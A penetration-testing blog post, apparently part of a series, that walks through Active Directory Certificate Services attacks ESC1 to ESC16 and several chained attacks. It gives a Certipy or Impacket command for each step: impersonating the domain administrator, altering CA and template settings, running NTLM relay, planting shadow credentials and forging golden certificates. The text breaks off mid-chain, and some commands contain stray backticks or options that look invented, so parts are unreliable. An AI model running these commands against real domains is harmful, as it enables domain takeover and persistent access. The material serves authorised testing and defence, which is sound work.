---
title: "Active Directory Pentest -PART 3-"
author: F1Z3R
description: "Technical documentation of attack vectors, methodologies, and exploitation techniques."
date: 2025-12-09 11:00 +0100
categories : [Pentesting, Active Directory]
tags: [windows, active directory, smb, ntlm relay, responder, esc1, certificate abuse, password cracking, winrm]
img_path: /assets/img/posts/Active-Directory/imageAD.jpg
image:
    path: /assets/img/posts/Active-Directory/imageAD.jpg
---
# Certipy - Certif Attacks

This article provides an in-depth exploration of all known **ESC (Escalate Certificate)** vulnerabilities within Active Directory Certificate Services (AD CS). We will cover each attack from ESC1 to ESC16, detailing the core vulnerability, its requirements, how to check for it using command-line tools (primarily **Certipy** and native Windows utilities), and the **Certipy** command to execute the exploit.

Our attacker persona will be the low-privileged user **`f13r@blog.local`** within the **`blog.local`** domain. We assume the Domain Controller is at `192.168.1.10` and the CA server is `ca.blog.local` (with CA name `BLOG-CA`).

## Initial Global AD CS Scan: Identifying All Vulnerabilities

Before diving into specific attacks, a crucial first step is to perform a global enumeration of the AD CS environment. **Certipy's `find` command** is invaluable here, as it can automatically detect common misconfigurations and assess the attacker's effective permissions.

This scan helps identify:

- Vulnerable templates (ESC1, ESC2, ESC3, ESC9, ESC15 potential).
- CA-level misconfigurations (ESC6, ESC16, ESC11 eligibility).
- Templates and objects where the attacker has dangerous write permissions (ESC4, ESC5, ESC7, ESC10/ESC14 potential).

### Certipy Global Scan Command

To kick off our assessment, `f13r` executes the following:

```bash
certipy find -u f13r@blog.local -p P@ssword123! -dc-ip 192.168.1.10 -vulnerable -stdout
```

- **Output Analysis:** The `vulnerable` flag is essential. It tells Certipy to highlight any identified templates, CA settings, or object ACLs that enable an ESC attack based on `f13r`'s permissions. This output will guide which specific attacks are most promising.

## 1.  ESC1: Misconfigured Certificate Templates (SAN Injection)

This is the most direct and frequently exploited privilege escalation vulnerability in AD CS.

- **Attack Description:** The ESC1 attack directly exploits a misconfigured certificate template. When a template has the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag enabled, the Certificate Authority (CA) implicitly trusts the requester to specify the identity (User Principal Name/Subject Alternative Name - UPN/SAN) in their Certificate Signing Request (CSR). An attacker leverages this by requesting a certificate for themselves, but specifying the UPN of a highly privileged user (e.g., `administrator@blog.local`) in the SAN field. The CA then issues a valid certificate for the administrator's identity, allowing the attacker to authenticate as that privileged user.

### Vulnerability Requirements & Checks

- **Requirement 1: Template Flag.** The target certificate template must have the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag enabled.
    - **Check Command:** The initial global scan using `certipy find -vulnerable` will typically flag this. You can specifically filter the output
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "ESC1"
        ```
        
- **Requirement 2: EKU & Permissions.** The template must include an Extended Key Usage (EKU) suitable for authentication (e.g., `Client Authentication` or `Any Purpose`), and the attacker (`f13r`) must have **Enrollment Rights** on this template.
    - **Check Command:** These conditions are assessed and confirmed by Certipy during its vulnerability enumeration (`vulnerable-templates`).

### Certipy Attack Command

Once confirmed, `f13r` executes the following to request a certificate impersonating the Administrator:

```bash
certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template ESC1 -alt administrator@blog.local -target ca.blog.local
```

## 2.  ESC2: Misconfigured Template (Any Purpose EKU)

While less direct than ESC1, this misconfiguration weakens the overall security posture.

- **Attack Description:** The ESC2 attack targets templates configured with the **`Any Purpose`** Extended Key Usage (EKU) (OID: `2.5.29.37.0`). Although `Client Authentication` (OID: `1.3.6.1.5.5.7.3.2`) is typically required for Kerberos authentication (PKINIT), the `Any Purpose` EKU can, in certain configurations or when combined with other weaknesses (like ESC6), be interpreted broadly enough by the Kerberos Distribution Center (KDC) or other applications to allow authentication or to bypass EKU restrictions in other attack chains.

### Vulnerability Requirements & Checks

- **Requirement 1: EKU.** The template must include the **`Any Purpose`** EKU.
    - **Check Command:** The global Certipy scan will highlight this. You can refine the search:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "Any Purpose"
        ```
        
- **Requirement 2: Permissions.** The attacker (`f13r`) must have **Enrollment Rights** on this template.
    - **Check Command:** This is verified by Certipy's vulnerability scan.

### Certipy Attack Command

To enroll a certificate from an ESC2-vulnerable template:

```bash
certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template ESC2 -target ca.blog.local
```

## 3. ESC3: Enrollment Agent Templates

This is a powerful two-step delegation attack, often used when direct impersonation is blocked.

- **Attack Description:** ESC3 is a two-phase privilege escalation that leverages templates granting the **`Certificate Request Agent`** EKU (OID: `1.3.6.1.4.1.311.20.2.1`).
    1. **Step 1:** The attacker (`f13r`) first enrolls for a certificate from the vulnerable template, effectively becoming an "Enrollment Agent." This agent certificate grants the holder the authority to **sign certificate requests on behalf of other users**.
    2. **Step 2:** The attacker then uses this newly acquired agent certificate to sign a *new* certificate request, claiming that the request is made **on behalf of a privileged user** (e.g., `administrator@blog.local`). The CA, seeing a valid agent signature, issues the certificate for the target administrator.

### Vulnerability Requirements & Checks

- **Requirement 1: EKU.** The template must include the **`Certificate Request Agent`** EKU.
    - **Check Command:**
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "Certificate Request Agent"
        ```
        
- **Requirement 2: Permissions.** The attacker (`f13r`) must have **Enrollment Rights** on the Enrollment Agent template.
    - **Check Command:** Verified by Certipy's vulnerability scan.

### Certipy Attack Commands

- **Step 1: Request the Enrollment Agent Certificate (Agent)**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template EnrollmentAgent -target ca.blog.local -out agent.pfx
    ```
    
- **Step 2: Use Agent Certificate to Impersonate Tareget**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template User -on-behalf-of blog\\administrator -pfx agent.pfx -target ca.blog.local
    ```
    

## 4. ESC4: Vulnerable Certificate Template Access Control (ACL Attack)

This attack targets the security descriptors (ACLs) of a template object, allowing for dynamic misconfiguration.

- **Attack Description:** Unlike ESC1-3 which exploit existing template settings, ESC4 leverages **weak Access Control Lists (ACLs)** on a template object itself within Active Directory. If an attacker has dangerous permissions like **`WriteProperty`**, **`WriteOwner`**, or **`GenericAll`** on a template, they can temporarily modify its configuration. The attacker's goal is to enable the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag (making it an ESC1-vulnerable template). After making this change, the attacker performs the ESC1 attack, and ideally, restores the template to its original secure configuration to cover their tracks.

### Vulnerability Requirements & Checks

- **Requirement 1: Vulnerable ACL.** The attacker (`f13r`) must have **Write permissions** (e.g., `WriteProperty` or `GenericAll`) on the target template object in Active Directory.
    - **Check Command:** The initial Certipy scan (`certipy find -vulnerable`) will highlight templates where `f13r` has write access. Look for output indicating **ESC4** and the attacker's write principals:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "ESC4"
        ```
        

### Certipy Attack Commands

- **Step 1: Modify the Template (Enable ESC1 Flag)**
    
    ```bash
    `certipy modify -u f13r@blog.local -p P@ssword123! -dc-ip 192.168.1.10 -template ESC4 -flags 1
    ```
    
- **Step 2: Exploit (Perform ESC1)**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template ESC4 -alt administrator@blog.local -target ca.blog.local
    ```
    
- **Step 3: Clean Up** (Restore the template to flag 0)
    
    ```bash
    certipy modify -u f13r@blog.local -p P@ssword123! -dc-ip 192.168.1.10 -template ESC4 -flags 0
    ```
    

## 5. ESC5: Vulnerable PKI Object Access Control (CA/Container ACL Attack)

This attack targets the broader AD CS infrastructure objects, enabling wide-ranging misconfigurations.

- **Attack Description:** ESC5 exploits **weak Access Control Lists (ACLs)** on critical AD CS objects, such as the **CA Object** itself or the **Certificate Templates Container** in Active Directory.
    - If `f13r` has **`WriteProperty`** on the **CA Object**, they can modify the CA's configuration registry (e.g., enable the ESC6 flag, or change certificate manager rights, leading to ESC7).
    - If `f13r` has **`GenericWrite`** on the **Certificate Templates Container**, they could potentially create entirely new, fully vulnerable certificate templates (e.g., a template vulnerable to ESC1 that everyone can enroll for).

### Vulnerability Requirements & Checks

- **Requirement 1: Vulnerable ACL.** The attacker (`f13r`) must have **Write permissions** (e.g., `WriteProperty` on the CA object or `GenericWrite` on the Templates Container).
    - **Check Command:** The global Certipy scan (`certipy find -vulnerable`) will identify write access on CA objects. Look for sections related to CA ACLs:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "CAACLs"
        ```
        

### Certipy Command (CA Configuration Modification Example - Enabling ESC6)

This example demonstrates how ESC5 (via `WriteProperty` on the CA) can enable ESC6.

- **Step 1: Enable ESC6 Flag on CA (using WriteProperty permission)**
    
    ```bash
    certipy setreg -u f13r@blog.local -p P@ssword123! -target ca.blog.local -ca BLOG-CA -edit-flags 0x40000
    ```
    
- **Step 2: Restart the Service** (Required for registry changes to apply)
    
    ```bash
    certipy restart -u f13r@blog.local -p P@ssword123! -target ca.blog.local
    ```
    

## 6. ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 (CA Configuration Attack)

This is a critical CA-wide misconfiguration that overrides all individual template security settings.

- **Attack Description:** ESC6 directly exploits the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag in the CA's registry configuration. When this flag is set, it forces the CA's policy module to **always accept Subject Alternative Names (SANs) supplied in the certificate request**, regardless of whether the specific certificate template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (ESC1) flag enabled. This effectively creates a **CA-wide ESC1 vulnerability**, allowing any attacker with enrollment rights on *any* template (even a secure one) to impersonate any user.

### Vulnerability Requirements & Checks

- **Requirement 1: CA Flag Set.** The **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag (`0x40000`) must be set in the CA's policy module configuration.
    - **Check Command (Certipy):** The initial global scan (`certipy find -vulnerable`) will detect this. Look for:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -stdout | findstr "UserSpecifiedSAN: Enabled (ESC6)"
        ```
        
    - **Check Command (Certutil - requires remote registry access):**
        
        ```bash
        `certutil -config "ca.blog.local\BLOG-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
        ```
        
        Look for `0x40000` within the output flags.
        

### Certipy Attack Command

Once confirmed, `f13r` can use any template for which they have enrollment rights (e.g., the default `User` template) to impersonate the Administrator:

```bash
`certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template User -alt administrator@blog.local -target ca.blog.local
```

## 7. ESC7: Vulnerable CA Access Control (ManageCertificates)

This attack bypasses the human approval process for high-value certificates.

- **Attack Description:** ESC7 exploits specific dangerous rights on the CA object, most commonly **`ManageCertificates`** (which is also implied by `ManageCA` rights). This permission allows the attacker to act as a **Certificate Manager**. The attacker submits a request for a highly privileged certificate (e.g., a **Subordinate Certificate Authority (SubCA)** certificate) which normally requires human approval from a CA administrator. Because the attacker has `ManageCertificates` rights, they can then manually **approve their own pending request**, obtaining the high-value certificate. A SubCA certificate can then be used to mint "Golden Certificates" (ESC12) and fully compromise the domain.

### Vulnerability Requirements & Checks

- **Requirement 1: Vulnerable ACL.** The attacker (`f13r`) must have **`ManageCertificates`** rights on the CA object.
    - **Check Command:** The initial Certipy scan (`certipy find -vulnerable`) will identify these permissions. Look for sections related to CA ACLs:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "CAACLs"
        ```
        

### Certipy Attack Commands (Example - Approving a SubCA Request)

- **Step 1: Submit a Pending Request** (The `SubCA` template typically requires manager approval)
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template SubCA -alt administrator@blog.local -target ca.blog.local
    ```
    
- **Step 2: Approve the Request** (Assume the request ID is `14` from the previous step's output)
    
    ```bash
    certipy approve -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -request-id 14 -target ca.blog.local
    ```
    

## 8. ESC8: NTLM Relay to AD CS HTTP Endpoints

This attack chains an NTLM relay attack with the AD CS Web Enrollment service.

- **Attack Description:** ESC8 combines a traditional **NTLM Relay** attack with the Certificate Enrollment Web Service (CES), which is often exposed via **HTTP/HTTPS** at `/certsrv`. The attacker sets up a listener and coerces a privileged victim (e.g., a Domain Controller or a high-value user with administrative rights on the DC) to authenticate to the attacker's machine. The attacker's listener intercepts the NTLM authentication and immediately **relays** it to the vulnerable AD CS Web Enrollment service. Using the relayed, authenticated session, the attacker forces the service to issue a high-value certificate (like a **`DomainController`** certificate) on behalf of the victim machine, which can then be used for domain compromise.

### Vulnerability Requirements & Checks

- **Requirement 1: Web Enrollment.** The AD CS Web Enrollment service must be enabled and accessible via HTTP.
    - **Check Command (Curl):**
        
        ```bash
        curl -I http://ca.blog.local/certsrv/certfnsh.asp
        ```
        
        Look for `WWW-Authenticate: Negotiate` or `NTLM` headers in the response.
        
- **Requirement 2: NTLM Relay.** The environment must be susceptible to NTLM Relay attacks. This typically means **SMB Signing** and/or **Extended Protection for Authentication (EPA)** are disabled or not enforced on the relay path.
    - **Check Command (Nmap):**
        
        ```bash
        nmap --script smb-security-mode -p 445 ca.blog.local
        ```
        
        Look for `Message signing enabled: false` or similar indicators.
        

### Impacket Attack Command (Attacker Listener)

The `ntlmrelayx.py` tool from Impacket is used for this attack:

```bash
python3 ntlmrelayx.py -t http://ca.blog.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"
```

## 9. ESC9: No Security Extension (Persistence)

This attack creates a persistent backdoor in the form of a certificate that survives password changes.

- **Attack Description:** ESC9 is a **persistence** attack that exploits certificate templates configured with the **`CT_FLAG_NO_SECURITY_EXTENSION`** flag (`0x80000`). This flag causes the CA to omit the critical **SID binding** extension (`szOID_NTDS_CA_SECURITY_EXT`) from the issued certificate. This extension is normally used by Kerberos (PKINIT) to strongly bind the certificate to the user's current Security Identifier (SID). Without this binding, the certificate remains valid for authentication even if the user's password hash in Active Directory has changed, providing a persistent backdoor to the account.

### Vulnerability Requirements & Checks

- **Requirement 1: Template Flag.** The template must have the **`CT_FLAG_NO_SECURITY_EXTENSION`** flag (`0x80000`) set.
    - **Check Command (Certipy):** The global Certipy scan will highlight this. You can specifically filter the output:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "NO_SECURITY_EXTENSION"
        ```
        
    - **Check Command (PowerShell - requires AD module):**
        
        ```bash
        (Get-ADObject "CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=blog,DC=local" -Properties msPKI-Enrollment-Flag).'msPKI-Enrollment-Flag' -band 0x80000
        ```
        
        A result of `524288` or `True` indicates the flag is set.
        

### Certipy Attack Command

To enroll a certificate from an ESC9-vulnerable template:

```bash
certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template ESC9 -target ca.blog.local -out f13r_esc9.pfx
```

## 10. ESC10/ESC14: Weak Certificate Mappings & Shadow Credentials

These attacks leverage write permissions on user objects to forge credentials for persistence.

- **Attack Description:** ESC10 and ESC14 encompass attacks that exploit **Write permissions** on a target user account (e.g., Domain Administrator) to map an attacker-controlled certificate or key to that account, achieving persistent access.
    - **ESC10 (older):** Manipulates the **`altSecurityIdentities`** attribute.
    - **ESC14 (modern/preferred - Shadow Credentials):** The attacker, having write access to a target user, plants a public key (a "shadow credential") onto the user's **`msDS-KeyCredentialLink`** attribute. Holding the corresponding private key, the attacker can then authenticate as the target user using Kerberos PKINIT, effectively creating a persistent backdoor that survives password changes.

### Vulnerability Requirements & Checks

- **Requirement 1: Write Permissions.** The attacker (`f13r`) must have **Write access** (e.g., `GenericWrite` or `WriteProperty`) on the target user's object in Active Directory.
    - **Check Command (Certipy):**
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -write-user-objects -stdout
        ```
        
        This command will list user accounts that `f13r` has write privileges over, indicating potential targets for Shadow Credentials.
        

### Certipy Attack Command (Shadow Credentials)

To add a shadow credential to the `administrator` account:

```bash
certipy shadow -u f13r@blog.local -p P@ssword123! -target administrator -action add -dc-ip 192.168.1.10
```

## 11. ESC11: IF_ENFORCEENCRYPTICERTREQUEST Bypass

This attack enables NTLM relay against the CA's DCOM/RPC endpoint, bypassing web service security.

- **Attack Description:** ESC11 exploits a specific CA registry configuration: when the **`IF_ENFORCEENCRYPTICERTREQUEST`** flag (`0x200`) is **cleared** (`0x0`) in the CA's InterfaceFlags. This setting allows certificate requests and NTLM authentication to be sent over **unencrypted DCOM/RPC** to the CA. This enables an NTLM Relay attack against the DCOM interface, even if the AD CS Web Enrollment service (targeted by ESC8) is disabled or secured. The process is similar to ESC8, but targets a different network endpoint.

### Vulnerability Requirements & Checks

- **Requirement 1: CA Flag Cleared.** The **`IF_ENFORCEENCRYPTICERTREQUEST`** flag (`0x200`) must **NOT** be set in the CA's `InterfaceFlags` registry key.
    - **Check Command (Certutil - requires remote registry access):**Bash
        
        `certutil -config "ca.blog.local\BLOG-CA" -getreg CA\InterfaceFlags`
        
        Look for a value of `0x0` or confirmation that `0x200` is not present.
        
- **Requirement 2: NTLM Relay.** The environment must be susceptible to NTLM Relay attacks.
    - **Check Command:** (Same as ESC8 - check SMB Signing/EPA settings.)

### Impacket Attack Command (Attacker Listener)

The `ntlmrelayx.py` tool from Impacket is used, but targeting the DCOM/RPC endpoint:

```bash
python3 ntlmrelayx.py -t ca.blog.local -smb2support --adcs-attack --adcs-template "DomainController"
```

## 12. ESC12: Shell Access to CA Server (Golden Certificate)

This attack represents the ultimate compromise of the PKI and the ability to forge any identity.

- **Attack Description:** ESC12 is the most severe attack, representing the full compromise of the PKI infrastructure. It requires the attacker to have **Shell Access** (Local Administrator or equivalent) on the Certificate Authority (CA) server itself. Once the CA server is compromised, the attacker can extract the CA's private key and certificate. This stolen CA key can then be used to **forge (mint) a "Golden Certificate"** for *any* user in the domain, including the Domain Administrator, granting an undeniable and highly persistent form of domain compromise.

### Vulnerability Requirements & Checks

- **Requirement 1: Compromise.** The attacker must achieve **Shell Access** (e.g., via exploit, phishing, or other means) on the CA server.
    - **Check Command:** This is an outcome of a prior attack. The ability to execute commands with administrative privileges on the CA server, such as dumping the CA's private key, confirms this requirement.
        
        ```bash
        whoami /groups
        ```
        
        (Once on the CA server, confirm administrative privileges).
        

### Certipy Attack Commands (Forge Certificate)

- **Step 1: Backup/Extract CA Key** (This step assumes `administrator@blog.local` credentials have been compromised to gain CA server access)
    
    ```bash
    certipy ca -backup -u administrator@blog.local -p SecurePass -dc-ip 192.168.1.10 -ca 'BLOG-CA' -target ca.blog.local
    ```
    
- **Step 2: Forge the Certificate** (Using the extracted CA key `BLOG-CA.pfx`)
    
    ```bash
    certipy forge -ca-pfx 'BLOG-CA.pfx' -upn administrator@blog.local -out administrator_golden.pfx
    ```
    

## 13. ESC13: Issuance Policy OID Group Links

This attack allows attackers to gain privileged group memberships through certificate authentication.

- **Attack Description:** ESC13 exploits a Kerberos feature where **Issuance Policies** defined on a certificate template can be directly linked to specific **Active Directory Security Groups**. If a template's Issuance Policy OID is linked to a highly privileged **Universal Group** (e.g., Enterprise Admins) via the `msDS-OIDToGroupLink` attribute, an attacker can request a certificate from this template. When the attacker authenticates with this certificate, the Kerberos Distribution Center (KDC) automatically includes the SID of the linked privileged group in the resulting Kerberos ticket (TGT), effectively granting the attacker membership in that group.

### Vulnerability Requirements & Checks

- **Requirement 1: OID Link.** An **Issuance Policy OID** on the template must be linked to a privileged **Universal Group** via the `msDS-OIDToGroupLink` attribute in Active Directory.
    - **Check Command (Certipy):** The global Certipy scan can highlight templates with Issuance Policies:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "Issuance Policy"
        ```
        
    - **Check Command (PowerShell - for OID-to-Group Link):**
        
        ```bash
        Get-ADObject -Filter 'objectClass -eq "msDS-OIDToGroupLink"' -Properties msDS-OIDToGroupLink, msDS-OIDValue
        ```
        
        Then, manually compare the `msDS-OIDValue` to OIDs found in vulnerable templates and check the linked `msDS-OIDToGroupLink` for privileged groups.
        

### Certipy Attack Command

To request a certificate from an ESC13-vulnerable template:

```bash
certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template ESC13Template -target ca.blog.local -out esc13.pfx
```

## 14. ESC15: Version 1 Template Application Policies

This attack bypasses EKU restrictions in older template versions by injecting malicious policies.

- **Attack Description:** ESC15 exploits a validation flaw specific to **Version 1 certificate templates**. These older templates often fail to properly validate the **Application Policies** field in the Certificate Signing Request (CSR). An attacker leverages this by requesting a certificate from a Version 1 template (even a seemingly secure one like `WebServer`) and, in the CSR, injects a dangerous Application Policy OID (e.g., the **`Certificate Request Agent`** OID). The CA issues the certificate, and because Application Policies often override or supplement Extended Key Usages (EKUs) during certificate validation, the certificate gains the malicious capability (like signing requests on behalf of others), despite the template's original intent.

### Vulnerability Requirements & Checks

- **Requirement 1: Template Version.** The target template must be a **Schema Version 1** template.
    - **Check Command (Certipy):** The global Certipy scan will indicate template versions:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "Schema Version: 1"
        ```
        
- **Requirement 2: Enrollment.** The attacker (`f13r`) must have **Enrollment Rights** on this Version 1 template.
    - **Check Command:** Verified by Certipy's vulnerability scan.

### Certipy Attack Command

To request a `WebServer` certificate but inject the `Certificate Request Agent` policy:

```bash
certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template WebServer -application-policies "1.3.6.1.4.1.311.20.2.1" -target ca.blog.local -out esc15_agent.pfx
```

## 15. ESC16: CA-Wide Security Extension Removal

This is a devastating, global CA misconfiguration that neutralizes SID binding for all certificates.

- **Attack Description:** ESC16 is a critical and global CA misconfiguration where the Certificate Authority (CA) itself is configured to **omit** the security extension (`szOID_NTDS_CA_SECURITY_EXT`) from **ALL** certificates it issues. This globally disables the strong SID binding enforced by modern Domain Controllers, which is crucial for secure PKINIT authentication. The consequence is that **every single certificate template** that allows client authentication becomes vulnerable to ESC1-style impersonation attacks. An attacker can request any certificate and, by providing a privileged UPN in the SAN, authenticate as that user, effectively a massive, CA-wide version of ESC9/ESC1 that cannot be mitigated by fixing individual templates.

### Vulnerability Requirements & Checks

- **Requirement 1: Global Removal.** The CA's registry must be configured to globally disable the security extension.
    - **Check Command (Certipy):** The global Certipy scan will directly identify this severe misconfiguration:
        
        ```bash
        certipy find -u f13r@blog.local -p P@ssword123! -stdout | findstr "ESC16 VULNERABLE!"
        ```
        
    - **Check Command (Certutil - requires remote registry access):**
        
        ```bash
        certutil -config "ca.blog.local\BLOG-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList
        ```
        
        Check if the security OID `1.3.6.1.4.1.311.25.2` is present in the `DisableExtensionList`.
        

### Certipy Attack Command

To request a certificate from any template (e.g., `User`) and impersonate Administrator:

```bash
certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template User -alt administrator@blog.local -target ca.blog.local
```

## Advanced AD CS Attack Chains (ESC Combinations)

The true power of AD CS exploitation lies in chaining initial access (low-level write or enrollment rights) to achieve a final, devastating goal (Domain Admin access or persistence). These four scenarios demonstrate the most critical and advanced chaining techniques.

### 1. Chain 1: Global Privilege Escalation via CA Modification

This chain transforms a localized administrative permission into the ability to impersonate **any user** in the domain.

- **Initial Primitive Required:** **ESC5** (Vulnerable CA ACL). The attacker must have **WriteProperty** on the CA Object.
- **Goal:** Global impersonation and privilege escalation.

### Attack Chain: ESC5 → ESC6 → ESC1

1. **Initial Access:** Attacker (`f13r`) leverages their **ESC5 WriteProperty** primitive on the CA Object.
2. **Modification (ESC6):** The attacker modifies the CA registry to enable the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag (`0x40000`). This is the global misconfiguration.
3. **Exploitation (ESC1):** With the CA globally misconfigured, the attacker requests a standard certificate but provides `administrator@blog.local` in the SAN.

### Certipy Attack Commands

- **Check Primitive (ESC5):** Look for write access on the CA object's ACLs.
    
    ```bash
    certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "CAACLs"
    ```
    
- **Step 1: Enable the ESC6 Flag (Modification)**
    
    ```bash
    certipy setreg -u f13r@blog.local -p P@ssword123! -target ca.blog.local -ca BLOG-CA -edit-flags +0x40000
    ```
    
- **Step 2: Exploit Globally (Impersonation)**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template User -alt administrator@blog.local -target ca.blog.local
    ```
    

### 2. Chain 2: Creating a Persistent Backdoor

This chain uses weak permissions on a template's ACL to establish **persistent access** that survives password resets.

- **Initial Primitive Required:** **ESC4** (Vulnerable Template ACL). The attacker must have **Write permissions** on an existing template.
- **Goal:** Create a persistent backdoor that survives password changes (ESC9).

### Attack Chain: ESC4 → ESC9 (Persistence Creation)

1. **Initial Access:** Attacker (`f13r`) leverages their **ESC4 Write permission** on a target template (e.g., `PersistentUser`).
2. **Modification (ESC9):** The attacker modifies the template's properties to inject the **`CT_FLAG_NO_SECURITY_EXTENSION`** flag (`0x80000`). This is the persistent misconfiguration.
3. **Exploitation (ESC9):** The attacker enrolls for a certificate from the modified template, gaining access that remains valid indefinitely.

### Certipy Attack Commands

- **Check Primitive (ESC4):** Look for write access on template ACLs.
    
    ```bash
    certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "WriteProperty"
    ```
    
- **Step 1: Inject the ESC9 Flag (Modification)**
    
    ```bash
    certipy modify -u f13r@blog.local -p P@ssword123! -dc-ip 192.168.1.10 -template PersistentUser -enroll-flags +0x80000
    ```
    
- **Step 2: Exploit for Persistence**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template PersistentUser -target ca.blog.local
    ```
    

### 3. Chain 3: Full Template System Takeover (Forging Authority)

This chain uses weak administrative rights to gain the ultimate power: the ability to act as a **Subordinate CA** and **forge any certificate** (the ESC12 attack).

- **Initial Primitive Required:** **ESC7** (ManageCertificates Rights). The attacker must have rights to approve requests.
- **Goal:** Obtain a **Subordinate CA Certificate** and forge a "Golden Certificate" (ESC12).

### Attack Chain: ESC7 → SubCA Certificate → ESC12

1. **Initial Access (ESC7):** Attacker submits a **SubCA** request (which goes pending) and uses their **ESC7 rights** to approve the request and gain the SubCA certificate.
2. **Exploitation (ESC12):** The attacker uses the issued SubCA certificate (which has signing authority) to **forge** a final certificate for the Domain Administrator.

### Certipy Attack Commands

- **Check Primitive (ESC7):** Look for `ManageCertificates` or `ManageCA` rights on the CA object.
    
    ```bash
    certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "ManageCertificates"
    ```
    
- **Step 1: Submit and Approve SubCA Request**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template SubCA -alt administrator@blog.local -target ca.blog.local
    ```
    
    *(The request goes pending, then the attacker uses `certipy approve` to issue it).*
    
- **Step 2: Forge Golden Certificate (ESC12)**
    
    ```bash
    certipy forge -ca-pfx subca_certificate.pfx -upn administrator@blog.local -out administrator_forged.pfx
    ```
    

### 4. Chain 4: Version 1 Template Agent Abuse

This chain exploits a flaw in an older template version to gain delegation rights, which are then used for impersonation.

- **Initial Primitive Required:** **ESC15** (V1 Template Flaw). The attacker needs Enrollment rights on a **Version 1 Template** (e.g., `WebServer`).
- **Goal:** Acquire **Enrollment Agent** rights to impersonate the Administrator (via ESC3).

### Attack Chain: ESC15 → Agent Certificate → ESC3 (Impersonation)

1. **Initial Access (ESC15):** The attacker enrolls for a Version 1 template while injecting the **`Certificate Request Agent`** application policy OID, bypassing EKU restrictions and gaining agent rights.
2. **Exploitation (ESC3):** The attacker uses the newly acquired agent certificate to sign a request **on behalf of the Domain Administrator**.

### Certipy Attack Commands

- **Check Primitive (ESC15):** Look for Version 1 templates with enrollment rights.
    
    ```bash
    certipy find -u f13r@blog.local -p P@ssword123! -vulnerable-templates -stdout | findstr "Schema Version: 1"
    ```
    
- **Step 1: Inject Policy to Get Agent Rights (ESC15)**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template WebServer -application-policies "1.3.6.1.4.1.311.20.2.1" -target ca.blog.local -out esc15_agent.pfx
    ```
    
- **Step 2: Impersonate Target (ESC3)**
    
    ```bash
    certipy req -u f13r@blog.local -p P@ssword123! -ca BLOG-CA -template User -on-behalf-of blog\\administrator -pfx esc15_agent.pfx -target ca.blog.local
    ```
    

## 5. Chain 5: Domain Compromise via NTLM Relay and Unencrypted RPC

This chain leverages the combined failure of NTLM protection and AD CS encryption standards to compromise the Domain Controller.

- **Initial Primitive Required:** Susceptibility to **NTLM Relay** (i.e., **SMB Signing** or **EPA** disabled) AND the **CA** must allow unencrypted requests.
- **Goal:** Obtain a **Domain Controller Certificate** and achieve high-level command execution.

### Attack Chain: ESC11 (Unencrypted RPC) → NTLM Relay → ESC8 (Cert Acquisition)

1. **Initial Access (ESC11):** The CA's registry lacks the **`IF_ENFORCEENCRYPTICERTREQUEST`** flag (`0x200`), allowing unencrypted DCOM/RPC communication.
2. **Exploitation (NTLM Relay):** The attacker sets up an NTLM listener and coerces a target (e.g., the Domain Controller) to authenticate over the network.
3. **Relay (ESC8):** The attacker **relays** the DC's NTLM authentication to the CA's DCOM/RPC enrollment interface.
4. **Acquisition (ESC8):** The CA issues a **Domain Controller Certificate** in the name of the DC machine.
5. **Final Step:** The attacker uses the highly privileged machine certificate for **Kerberos authentication (PKINIT)** to request a TGT for the DC and perform actions like DCSync (extracting all domain hashes).

### Impacket/Certipy Attack Commands

- **Check Primitive (ESC11):** Verify the CA allows unencrypted requests.
    
    ```bash
